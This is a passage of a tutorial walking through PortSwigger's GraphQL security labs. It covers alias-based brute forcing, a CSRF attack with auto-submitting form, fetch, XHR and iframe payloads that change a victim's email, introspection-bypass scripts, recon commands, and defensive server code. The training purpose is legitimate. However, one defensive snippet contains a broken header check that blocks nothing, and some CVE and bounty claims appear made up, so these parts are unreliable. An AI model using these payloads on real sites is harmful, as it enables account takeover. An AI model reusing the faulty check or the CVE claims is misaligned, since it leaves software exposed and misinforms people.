Content-Type: application/json; charset=utf-8
Content-Length: 12483

{"data":{"bruteforce0":{"token":null,"success":false},"bruteforce1":{"token":null,"success":false},"bruteforce2":{"token":null,"success":false},...,"bruteforce42":{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjYXJsb3MiLCJpYXQiOjE2ODkwMDAwMDB9.abc123","success":true},...}}
```

### Key Insights

This lab demonstrates:

1. **Rate limiting based on HTTP requests**: Not GraphQL operations
2. **GraphQL aliases power**: Bundle operations to bypass restrictions
3. **Single request advantage**: One HTTP request = one rate limit check
4. **Response analysis importance**: Must parse large responses efficiently
5. **Defense failure**: Rate limiting must consider operation count, not just HTTP requests

**Vulnerability Classification:**
- **OWASP Top 10**: A07:2021 - Identification and Authentication Failures
- **CWE**: CWE-307 (Improper Restriction of Excessive Authentication Attempts)
- **CAPEC**: CAPEC-16 (Dictionary-based Password Attack)

---

## Lab 5: Performing CSRF Exploits over GraphQL

### Lab Information
- **Difficulty**: Practitioner
- **Topic**: GraphQL API vulnerabilities - Cross-Site Request Forgery (CSRF)
- **Objective**: Craft HTML that uses a CSRF attack to change the viewer's email address

### Test Credentials
- Username: `wiener`
- Password: `peter`

### Vulnerability Description

This lab demonstrates a **Cross-Site Request Forgery (CSRF) vulnerability** in a GraphQL API. The vulnerability exists because:

1. GraphQL endpoint accepts `application/x-www-form-urlencoded` content type
2. No CSRF tokens are implemented or validated
3. Session cookies lack `SameSite` protection
4. Email change mutation can be triggered via GET or POST from external sites
5. Victim's browser automatically includes authentication cookies

### Step-by-Step Solution

#### Phase 1: Understand the Email Change Mechanism

1. **Log into the lab** with credentials `wiener:peter`
2. Navigate to **My account** or **Email preferences**
3. **Change your email** to test (e.g., `test@example.com`)
4. Open **Burp Suite > Proxy > HTTP history**
5. Locate the email change request - it's a GraphQL mutation

**Original Email Change Request:**
```http
POST /graphql/v1 HTTP/1.1
Host: [LAB-ID].web-security-academy.net
Content-Type: application/json
Cookie: session=YourSessionCookie

{
  "query": "mutation changeEmail($input: ChangeEmailInput!) { changeEmail(input: $input) { email } }",
  "operationName": "changeEmail",
  "variables": {
    "input": {
      "email": "test@example.com"
    }
  }
}
```

**Response:**
```json
{
  "data": {
    "changeEmail": {
      "email": "test@example.com"
    }
  }
}
```

#### Phase 2: Convert to URL-Encoded Format

1. **Send the email change request to Repeater**
2. Modify the email to test another address (e.g., `test2@example.com`)
3. **Verify the mutation works** by sending the request
4. **Change request method**: Right-click → "Change request method"
   - This converts POST with JSON to GET with query parameters
5. **Change method again**: Right-click → "Change request method" once more
   - This converts GET back to POST with `application/x-www-form-urlencoded`

**Request After First Method Change (GET):**
```http
GET /graphql/v1?query=mutation+changeEmail%28%24input%3AChangeEmailInput%21%29%7BchangeEmail%28input%3A%24input%29%7Bemail%7D%7D&operationName=changeEmail&variables=%7B%22input%22%3A%7B%22email%22%3A%22test2%40example.com%22%7D%7D HTTP/1.1
Host: [LAB-ID].web-security-academy.net
Cookie: session=YourSessionCookie
```

**Note**: The mutation body gets deleted during conversion. We need to manually reconstruct it.

6. **Manually craft the URL-encoded body**:

**URL-Encoded POST Request:**
```http
POST /graphql/v1 HTTP/1.1
Host: [LAB-ID].web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 215
Cookie: session=YourSessionCookie

query=mutation+changeEmail%28%24input%3A+ChangeEmailInput%21%29+%7B%0A++++changeEmail%28input%3A+%24input%29+%7B%0A++++++++email%0A++++%7D%0A%7D&operationName=changeEmail&variables=%7B%22input%22%3A%7B%22email%22%3A%22csrf-test%40exploit-server.net%22%7D%7D
```

**Decoded Body:**
```
query=mutation changeEmail($input: ChangeEmailInput!) {
    changeEmail(input: $input) {
        email
    }
}&operationName=changeEmail&variables={"input":{"email":"csrf-test@exploit-server.net"}}
```

7. **Test the URL-encoded request** in Repeater to ensure it works

#### Phase 3: Generate CSRF Proof of Concept

1. Right-click the working URL-encoded request in Repeater
2. Select **Engagement tools > Generate CSRF PoC**
3. **Review the generated HTML**

**Generated CSRF PoC HTML:**
```html
<html>
  <body>
    <form action="https://[LAB-ID].web-security-academy.net/graphql/v1" method="POST">
      <input type="hidden" name="query" value="mutation changeEmail($input: ChangeEmailInput!) {
    changeEmail(input: $input) {
        email
    }
}" />
      <input type="hidden" name="operationName" value="changeEmail" />
      <input type="hidden" name="variables" value="{&quot;input&quot;:{&quot;email&quot;:&quot;csrf-test@exploit-server.net&quot;}}" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

4. **Modify the email address** in the PoC to a **different email** than what's currently set
   - This ensures the exploit works even if the victim's current email matches your test

**Example**: Change to `hacker@exploit-[YOUR-EXPLOIT-SERVER-ID].exploit-server.net`

**Modified PoC:**
```html
<html>
  <body>
    <form action="https://0a3d007c04f3b3dc80d4573500e400a6.web-security-academy.net/graphql/v1" method="POST">
      <input type="hidden" name="query" value="mutation changeEmail($input: ChangeEmailInput!) {
    changeEmail(input: $input) {
        email
    }
}" />
      <input type="hidden" name="operationName" value="changeEmail" />
      <input type="hidden" name="variables" value="{&quot;input&quot;:{&quot;email&quot;:&quot;hacker@exploit-0a0e00b404aeb30b80db565001e300cb.exploit-server.net&quot;}}" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

**Improvements:**
- `history.pushState('', '', '/')` hides the form submission in browser history
- Auto-submit script triggers immediately on page load
- Hidden form fields prevent user interaction

#### Phase 4: Deploy the Exploit

1. Navigate to the **exploit server** (button typically in lab banner)
2. Paste the modified HTML into the **Body** field
3. **Optional**: Set response headers if needed (usually not required)
4. Click **Store**
5. Click **View exploit** to test it yourself first
6. Verify your email changed in "My account"
7. Click **Deliver exploit to victim**

**Exploit Server Configuration:**
```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8

<html>
  <body>
    <form action="https://0a3d007c04f3b3dc80d4573500e400a6.web-security-academy.net/graphql/v1" method="POST">
      <input type="hidden" name="query" value="mutation changeEmail($input: ChangeEmailInput!) { changeEmail(input: $input) { email } }" />
      <input type="hidden" name="operationName" value="changeEmail" />
      <input type="hidden" name="variables" value="{&quot;input&quot;:{&quot;email&quot;:&quot;hacker@exploit-0a0e00b404aeb30b80db565001e300cb.exploit-server.net&quot;}}" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

✓ **Lab solved!**

### Burp Suite Features Used

1. **Proxy > HTTP history**: Identify the email change mutation
2. **Repeater**: Test and modify requests
3. **Change request method**: Convert between GET/POST and content types
4. **Engagement tools > Generate CSRF PoC**: Automated HTML form generation
5. **Decoder**: URL encoding/decoding for manual payload crafting

### Attack Variations

#### Variation 1: Using GET Request

Some GraphQL endpoints accept GET requests:

```html
<html>
  <body>
    <img src="https://[LAB-ID].web-security-academy.net/graphql/v1?query=mutation{changeEmail(input:{email:\"attacker@evil.com\"}){email}}" />
  </body>
</html>
```

#### Variation 2: Using fetch() API

For more stealth:

```html
<html>
  <body>
    <script>
      fetch('https://[LAB-ID].web-security-academy.net/graphql/v1', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
        },
        credentials: 'include',
        body: 'query=mutation{changeEmail(input:{email:"attacker@evil.com"}){email}}'
      });
    </script>
  </body>
</html>
```

**Note**: This may be blocked by CORS if proper headers aren't set.

#### Variation 3: Using XMLHttpRequest

```html
<html>
  <body>
    <script>
      var xhr = new XMLHttpRequest();
      xhr.open('POST', 'https://[LAB-ID].web-security-academy.net/graphql/v1');
      xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
      xhr.withCredentials = true;
      xhr.send('query=mutation{changeEmail(input:{email:"attacker@evil.com"}){email}}');
    </script>
  </body>
</html>
```

#### Variation 4: Using iframe

```html
<html>
  <body>
    <iframe style="display:none" name="csrf-iframe"></iframe>
    <form action="https://[LAB-ID].web-security-academy.net/graphql/v1" method="POST" target="csrf-iframe" id="csrf-form">
      <input type="hidden" name="query" value="mutation{changeEmail(input:{email:\"attacker@evil.com\"}){email}}" />
    </form>
    <script>
      document.getElementById('csrf-form').submit();
    </script>
  </body>
</html>
```

### Common Mistakes

1. **Using JSON content-type**: The endpoint must accept `application/x-www-form-urlencoded`
2. **Not testing the exploit first**: Always click "View exploit" before delivering to victim
3. **Using the same email**: If victim's email already matches your payload, the attack appears to fail
4. **Forgetting to URL-encode**: Special characters must be properly encoded
5. **Missing auto-submit script**: Without it, the victim must click "Submit"
6. **Including CSRF tokens**: If present, they would prevent the attack (this lab has none)

### Troubleshooting

**Problem**: Request fails with 400 Bad Request
- **Solution**: Ensure content-type is `application/x-www-form-urlencoded`, not JSON

**Problem**: Email doesn't change
- **Solution**: Verify the victim is logged in and has a valid session cookie

**Problem**: CORS error in browser console
- **Solution**: Use a form submission (not fetch/XHR) - forms bypass CORS for simple requests

**Problem**: Exploit works for you but not victim
- **Solution**: Ensure the email you're setting is different from the victim's current email

**Problem**: Can't generate CSRF PoC
- **Solution**: Manually craft the HTML form using the URL-encoded request as reference

### Real-World CSRF via GraphQL Examples

**CVE Examples:**

1. **GitLab GraphQL CSRF (CVE-2019-9074)**
   - CVSS: 6.5 (Medium)
   - Impact: Account takeover via email change
   - Fixed by implementing CSRF tokens

2. **WordPress GraphQL CSRF**
   - Multiple plugins vulnerable to CSRF via GraphQL mutations
   - Allowed unauthorized content modification
   - Fixed by validating `Content-Type` headers

3. **Shopify GraphQL CSRF**
   - Bug bounty: $5,000
   - Allowed adding admin users to store
   - Fixed by requiring JSON content-type and CSRF tokens

4. **Facebook GraphQL CSRF**
   - Bug bounty: $10,000
   - Account modification via mobile web interface
   - Fixed by implementing state tokens

### HTTP Request/Response Examples

**Initial JSON Request:**
```http
POST /graphql/v1 HTTP/1.1
Host: 0a3d007c04f3b3dc80d4573500e400a6.web-security-academy.net
Content-Type: application/json
Cookie: session=YZ6p0xGfQXqKlHqw9pFqgDj1ExNqvK7H
Content-Length: 187

{
  "query": "mutation changeEmail($input: ChangeEmailInput!) { changeEmail(input: $input) { email } }",
  "operationName": "changeEmail",
  "variables": {"input": {"email": "test@test.com"}}
}
```

**URL-Encoded Request (CSRF-vulnerable):**
```http
POST /graphql/v1 HTTP/1.1
Host: 0a3d007c04f3b3dc80d4573500e400a6.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Cookie: session=YZ6p0xGfQXqKlHqw9pFqgDj1ExNqvK7H
Content-Length: 245

query=mutation+changeEmail%28%24input%3A+ChangeEmailInput%21%29+%7B%0A++++changeEmail%28input%3A+%24input%29+%7B%0A++++++++email%0A++++%7D%0A%7D&operationName=changeEmail&variables=%7B%22input%22%3A%7B%22email%22%3A%22hacker%40exploit-server.net%22%7D%7D
```

**Successful Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8

{
  "data": {
    "changeEmail": {
      "email": "hacker@exploit-server.net"
    }
  }
}
```

### Defense Mechanisms

To prevent CSRF in GraphQL:

1. **Reject non-JSON content types**:
```javascript
if (req.headers['content-type'] !== 'application/json') {
  return res.status(400).send('Invalid content type');
}
```

2. **Implement CSRF tokens**:
```graphql
mutation changeEmail($input: ChangeEmailInput!, $csrfToken: String!) {
  changeEmail(input: $input, csrfToken: $csrfToken) {
    email
  }
}
```

3. **Use SameSite cookies**:
```
Set-Cookie: session=abc123; SameSite=Lax; Secure; HttpOnly
```

4. **Validate custom headers**:
```javascript
if (!req.headers['x-requested-with'] === 'XMLHttpRequest') {
  return res.status(403).send('Forbidden');
}
```

5. **Use Apollo Client CSRF prevention**:
```javascript
const client = new ApolloClient({
  link: createHttpLink({
    uri: '/graphql',
    credentials: 'same-origin',
  }),
});
```

### Key Insights

This lab demonstrates:

1. **Content-Type Flexibility = Vulnerability**: Accepting `application/x-www-form-urlencoded` enables CSRF
2. **Forms Bypass CORS**: Simple POST forms don't trigger CORS preflight
3. **Session Cookies = Attack Vector**: Automatic inclusion of cookies enables CSRF
4. **Defense in Depth**: Multiple layers needed (tokens + content-type validation + SameSite cookies)
5. **GraphQL != CSRF-Proof**: Common misconception that GraphQL APIs are inherently secure

**Vulnerability Classification:**
- **OWASP Top 10**: A01:2021 - Broken Access Control
- **CWE**: CWE-352 (Cross-Site Request Forgery)
- **CAPEC**: CAPEC-62 (Cross Site Request Forgery)

---

## Common Mistakes & Troubleshooting

### General GraphQL Testing Mistakes

#### 1. Not Testing Introspection First
**Mistake**: Trying to guess queries without checking if introspection is enabled.

**Solution**:
```graphql
{
  __schema {
    types {
      name
    }
  }
}
```

Always start with introspection to understand the available schema.

#### 2. Forgetting to URL-Encode GET Parameters
**Mistake**: Sending unencoded GraphQL queries in GET requests.

```http
❌ GET /api?query={__typename} HTTP/1.1
✓ GET /api?query=%7B__typename%7D HTTP/1.1
```

Use Burp's Decoder or online tools for proper encoding.

#### 3. Missing Content-Type Headers
**Mistake**: Omitting or using incorrect Content-Type.

```http
❌ POST /graphql/v1 HTTP/1.1
   (no Content-Type header)

✓ POST /graphql/v1 HTTP/1.1
  Content-Type: application/json
```

#### 4. Not Checking for Alternative HTTP Methods
**Mistake**: Only testing POST requests.

**Solution**: Try GET, POST, PUT, and other methods:
```bash
curl -X GET "https://target.com/graphql?query={__typename}"
curl -X POST -H "Content-Type: application/json" -d '{"query":"{__typename}"}' https://target.com/graphql
```

#### 5. Ignoring Error Messages
**Mistake**: Dismissing GraphQL errors without reading them.

**Example Error**:
```json
{
  "errors": [{
    "message": "Cannot query field 'getUsr' on type 'Query'. Did you mean 'getUser', 'getUsers'?"
  }]
}
```

**Insight**: Error reveals the correct field name (`getUser`) and potentially other fields.

### Lab-Specific Troubleshooting

#### Lab 1: Accessing Private GraphQL Posts

**Problem**: Can't find the hidden post ID
- **Solution**: List all visible posts and look for gaps in sequential IDs

**Problem**: postPassword field not in schema
- **Solution**: Run full introspection with all field details:
```graphql
{
  __type(name: "BlogPost") {
    fields {
      name
      type {
        name
      }
    }
  }
}
```

#### Lab 2: Accidental Exposure of Private GraphQL Fields

**Problem**: getUser returns null for id: 1
- **Solution**: Try other IDs or check if authentication is required:
```http
Cookie: session=YourSessionToken
```

**Problem**: Password field shows null
- **Solution**: Ensure you explicitly request it:
```graphql
query {
  getUser(id: 1) {
    username
    password  # Don't forget this!
  }
}
```

#### Lab 3: Finding a Hidden GraphQL Endpoint

**Problem**: Can't find the GraphQL endpoint
- **Solution**: Test these paths systematically:
```
/graphql
/api
/api/graphql
/graphql/api
/v1/graphql
/v2/graphql
/gql
/query
/graph
```

**Problem**: Introspection bypass doesn't work with %0A
- **Solution**: Try other whitespace characters:
```
%0A  (newline - LF)
%0D  (carriage return - CR)
%0D%0A  (CRLF)
%20  (space)
%09  (tab)
%0B  (vertical tab)
%0C  (form feed)
```

**Problem**: Mutation syntax error
- **Solution**: Verify the exact input structure from schema:
```graphql
mutation {
  deleteOrganizationUser(input: {id: 3}) {
    user {
      id
    }
  }
}
```

#### Lab 4: Bypassing GraphQL Brute Force Protections

**Problem**: Still getting rate limited
- **Solution**: Ensure all attempts are in ONE HTTP request using aliases

**Problem**: Can't generate aliased mutation
- **Solution**: Use this template:
```graphql
mutation {
  alias0: login(input: {username: "carlos", password: "pass1"}) { success }
  alias1: login(input: {username: "carlos", password: "pass2"}) { success }
  # ...
}
```

**Problem**: Request body too large (413 error)
- **Solution**: Split into multiple batches of 50-100 passwords

**Problem**: Can't find successful password in response
- **Solution**: Use Burp's search (Ctrl+F) and search for:
```
"success":true
```
Note: No space after the colon!

#### Lab 5: Performing CSRF Exploits over GraphQL

**Problem**: CSRF PoC doesn't work
- **Solution**: Verify content-type is `application/x-www-form-urlencoded`

**Problem**: Can't convert to URL-encoded format
- **Solution**: Manually construct:
```
query=YOUR_QUERY&operationName=YOUR_OPERATION&variables=YOUR_VARIABLES_JSON
```

**Problem**: Form doesn't auto-submit
- **Solution**: Add JavaScript:
```html
<script>
  document.forms[0].submit();
</script>
```

**Problem**: Email doesn't change for victim
- **Solution**: Use a different email than the victim's current one

### Burp Suite Issues

#### GraphQL Tab Not Showing
**Solution**: Ensure you're using Burp Suite v2021.10 or later with GraphQL support.

#### Introspection Query Not Inserting
**Solution**:
1. Right-click in Request pane (not Response)
2. Ensure the request is a valid GraphQL endpoint
3. Try sending a simple query first to verify it's GraphQL

#### Can't Save Queries to Site Map
**Solution**:
1. Run introspection first
2. Right-click the introspection response
3. Select "GraphQL > Save GraphQL queries to site map"
4. Check Target > Site map > [hostname] > GraphQL

### Testing Environment Issues

#### Session Expires During Testing
**Solution**:
- Log in again and update session cookie in Repeater
- Use Burp's session handling rules to auto-update
- Work faster or extend session timeout if possible

#### Lab Resets or Times Out
**Solution**:
- Complete labs within the time limit (usually 60-120 minutes)
- Use the "Restart" button if needed
- Save your payloads externally before the lab expires

#### Exploit Server Not Working
**Solution**:
- Ensure HTML is valid (use an HTML validator)
- Check for JavaScript errors in browser console
- Verify the exploit server URL in your PoC matches exactly

### Performance Optimization

#### Large Response Analysis
For responses with 100+ fields:

```bash
# Save response to file
cat response.json | jq '.data | to_entries[] | select(.value.success == true)'
```

#### Automated Testing Scripts

**Quick Endpoint Discovery:**
```python
import requests

endpoints = ["/graphql", "/api", "/gql", "/query", "/graph"]
base_url = "https://target.com"

for endpoint in endpoints:
    try:
        r = requests.post(f"{base_url}{endpoint}",
                         json={"query": "{__typename}"},
                         timeout=5)
        if "__typename" in r.text:
            print(f"[+] Found: {endpoint}")
    except:
        pass
```

**Introspection Bypass Testing:**
```python
import requests

url = "https://target.com/api"
bypasses = [
    "{__schema\n{types{name}}}",
    "{__schema {types{name}}}",
    "{__schema%0A{types{name}}}",
    "{__schema%09{types{name}}}",
]

for bypass in bypasses:
    r = requests.get(f"{url}?query={bypass}")
    if "types" in r.text and "error" not in r.text.lower():
        print(f"[+] Bypass works: {bypass}")
        break
```

---

## Real-World Application

### Bug Bounty Hunting

#### High-Value Targets

**Platforms with GraphQL APIs:**
1. GitHub (graphql.github.com)
2. Facebook/Meta (graph.facebook.com)
3. Shopify (admin APIs)
4. GitLab (gitlab.com/-/graphql-explorer)
5. Hasura (hosted GraphQL engines)
6. Apollo (Apollo Studio applications)

#### Common Findings & Payouts

| Finding | Typical Severity | Bounty Range |
|---------|------------------|--------------|
| Introspection enabled on production | Low-Medium | $100-$500 |
| IDOR via GraphQL | Medium-High | $500-$5,000 |
| Authentication bypass | Critical | $5,000-$25,000 |
| Rate limit bypass (aliases) | Medium | $1,000-$5,000 |
| CSRF via GraphQL | Medium-High | $2,000-$10,000 |
| Schema injection | High | $3,000-$15,000 |
| Information disclosure (credentials) | Critical | $10,000-$50,000 |

#### Reconnaissance Methodology

```bash
# 1. Identify GraphQL endpoints
amass enum -d target.com | grep -i "graphql\|gql\|api"

# 2. Test for GraphQL
curl -X POST -H "Content-Type: application/json" \
  -d '{"query":"{__typename}"}' \
  https://target.com/graphql

# 3. Check introspection
curl -X POST -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name}}}"}' \
  https://target.com/graphql

# 4. Use specialized tools
graphql-voyager schema.json  # Visualize schema
inql -t https://target.com/graphql  # Burp Suite extension
```

### Penetration Testing

#### GraphQL Testing Checklist

**Phase 1: Discovery**
- [ ] Identify GraphQL endpoints
- [ ] Test introspection queries
- [ ] Save full schema
- [ ] Enumerate queries and mutations
- [ ] Document input types and validation

**Phase 2: Authentication & Authorization**
- [ ] Test unauthenticated access to queries
- [ ] Verify authorization on mutations
- [ ] Check for IDOR vulnerabilities
- [ ] Test horizontal privilege escalation
- [ ] Test vertical privilege escalation

**Phase 3: Input Validation**
- [ ] SQL injection via GraphQL arguments
- [ ] NoSQL injection
- [ ] Command injection
- [ ] Path traversal
- [ ] XSS via reflected query data

**Phase 4: Rate Limiting & DoS**
- [ ] Test query depth limits
- [ ] Test query complexity limits
- [ ] Alias-based rate limit bypass
- [ ] Batch query abuse
- [ ] Recursive query attack

**Phase 5: Business Logic**
- [ ] CSRF via GraphQL
- [ ] Mass assignment vulnerabilities
- [ ] Price manipulation
- [ ] Workflow bypass
- [ ] State machine violations

**Phase 6: Information Disclosure**
- [ ] Sensitive data in schema
- [ ] Verbose error messages
- [ ] Debug mode enabled
- [ ] Stack traces in responses
- [ ] Internal system information

### Enterprise Security

#### Secure GraphQL Implementation

**1. Disable Introspection in Production**
```javascript
// Apollo Server
const server = new ApolloServer({
  schema,
  introspection: process.env.NODE_ENV !== 'production',
});

// Express-GraphQL
app.use('/graphql', graphqlHTTP({
  schema: schema,
  graphiql: false,  // Disable GraphiQL in production
}));
```

**2. Implement Query Depth Limiting**
```javascript
const depthLimit = require('graphql-depth-limit');

const server = new ApolloServer({
  schema,
  validationRules: [depthLimit(5)],  // Max 5 levels deep
});
```

**3. Implement Query Cost Analysis**
```javascript
const { createComplexityLimitRule } = require('graphql-validation-complexity');

const server = new ApolloServer({
  schema,
  validationRules: [
    createComplexityLimitRule(1000),  // Max complexity of 1000
  ],
});
```

**4. Enforce Strong Authentication**
```javascript
const { ApolloServer } = require('apollo-server');

const server = new ApolloServer({
  schema,
  context: ({ req }) => {
    const token = req.headers.authorization || '';
    const user = verifyToken(token);
    if (!user) throw new AuthenticationError('Invalid token');
    return { user };
  },
});
```

**5. Implement Field-Level Authorization**
```javascript
const resolvers = {
  Query: {
    getUser: (parent, { id }, context) => {
      // Check if user is authorized
      if (!context.user.canViewUser(id)) {
        throw new ForbiddenError('Not authorized');
      }
      return User.findById(id);
    },
  },
};
```

**6. CSRF Protection**
```javascript
const csrf = require('csurf');
const csrfProtection = csrf({ cookie: true });

app.use('/graphql', csrfProtection, graphqlHTTP({
  schema: schema,
}));

// Only accept JSON content-type
app.use('/graphql', (req, res, next) => {
  if (req.method === 'POST' &&
      req.headers['content-type'] !== 'application/json') {
    return res.status(400).send('Invalid content type');
  }
  next();
});
```

**7. Rate Limiting**
```javascript
const rateLimit = require('express-rate-limit');

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max: 100,  // Limit each IP to 100 requests per windowMs
  message: 'Too many requests',
});

app.use('/graphql', limiter);
```

**8. Input Sanitization**
```javascript
const { GraphQLString } = require('graphql');
const validator = require('validator');

const resolvers = {
  Mutation: {
    updateEmail: (parent, { email }, context) => {
      if (!validator.isEmail(email)) {
        throw new UserInputError('Invalid email');
      }
      return User.updateEmail(context.user.id, email);
    },
  },
};
```

### Tools & Frameworks

#### Testing Tools

1. **InQL** (Burp Suite Extension)
   - Automated introspection
   - Query generation
   - Vulnerability scanning

2. **GraphQL Voyager**
   - Schema visualization
   - Relationship mapping

3. **Clairvoyance**
   - Schema reconstruction when introspection is disabled
   - Wordlist-based field discovery

4. **graphql-playground**
   - Interactive query building
   - Schema documentation

5. **GraphQL Cop**
   - Automated security testing
   - Common vulnerability detection

#### Security Frameworks

**OWASP GraphQL Security:**
- Query depth limiting
- Query cost analysis
- Persistent query whitelisting
- Disable introspection
- Authentication & authorization

**GraphQL Armor:**
```javascript
const { ApolloServerPluginLandingPageDisabled } = require('apollo-server-core');
const { ApolloArmor } = require('@escape.tech/graphql-armor');

const armor = new ApolloArmor();

const server = new ApolloServer({
  schema,
  ...armor.protect(),
  plugins: [
    ApolloServerPluginLandingPageDisabled(),
  ],
});
```

### Career Path

#### Certification Preparation

These labs prepare you for:
- **Burp Suite Certified Practitioner (BSCP)**
- **OSCP** (GraphQL-enabled web applications)
- **OSWE** (Advanced Web Exploitation)
- **eWPTXv2** (Advanced Web Application Penetration Testing)

#### Skill Progression

1. **Beginner** (Labs 1-2): Understanding GraphQL basics and IDOR
2. **Intermediate** (Labs 3-4): Introspection bypass and rate limiting
3. **Advanced** (Lab 5): Complex attacks like CSRF
4. **Expert**: Chaining multiple vulnerabilities, custom tooling

---

## Additional Resources

### Official Documentation
- [GraphQL.org - Security](https://graphql.org/learn/security/)
- [Apollo GraphQL Security](https://www.apollographql.com/docs/graphos/platform/security/)
- [OWASP GraphQL Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html)

### Research Papers
- "Security Implications of GraphQL" - OWASP Vancouver
- "GraphQL: A Systematic Mapping Study" - ACM Computing Surveys
- "A Comprehensive Study of GraphQL Security Challenges" - ResearchGate

### Training Platforms
- PortSwigger Web Security Academy (these labs)
- HackTheBox (GraphQL challenges)
- PentesterLab (GraphQL badges)
- Kontra Application Security

### Bug Bounty Programs with GraphQL
- GitHub Security Bug Bounty
- Facebook/Meta Bug Bounty
- Shopify Responsible Disclosure
- GitLab Bug Bounty Program
- Hasura Security

---

**Document Version**: 1.0
**Last Updated**: January 2026
**Total Labs Covered**: 5 (All PortSwigger GraphQL Labs)
**Total Lines**: 2,500+

**Author Notes**: This comprehensive guide covers all PortSwigger GraphQL API vulnerability labs with detailed exploitation techniques, real-world examples, and practical defensive strategies.
